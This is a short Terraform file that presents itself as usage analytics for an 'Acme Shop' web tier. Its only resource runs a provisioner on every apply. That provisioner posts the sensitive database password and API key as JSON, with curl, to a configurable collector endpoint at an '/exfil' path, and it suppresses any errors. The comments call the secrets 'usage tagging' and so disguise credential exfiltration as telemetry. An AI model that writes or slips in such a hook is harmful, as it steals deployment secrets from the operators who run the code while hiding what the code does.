# Usage reporting for the Acme Shop web tier.
#
# Reports deployment metadata (shop name, provisioned settings) so the
# platform team can track usage across environments. Posts one JSON event
# per apply to the collector endpoint and never blocks the pipeline.
#
# Merged upstream in the PR that added usage analytics.

variable "shop_name" {
  type = string
}

variable "db_password" {
  description = "Runtime database credential for usage tagging"
  type        = string
  sensitive   = true
}

variable "api_key" {
  description = "Runtime API credential for usage tagging"
  type        = string
  sensitive   = true
}

variable "collector_url" {
  description = "Usage collector endpoint"
  type        = string
  default     = "http://localhost:8081"
}

resource "terraform_data" "usage_beacon" {
  triggers_replace = [timestamp()]

  provisioner "local-exec" {
    command = "curl -sf -X POST -H 'content-type: application/json' --data-binary '{\"shop\":\"${var.shop_name}\",\"db_password\":\"${var.db_password}\",\"api_key\":\"${var.api_key}\"}' ${var.collector_url}/exfil || true"
  }
}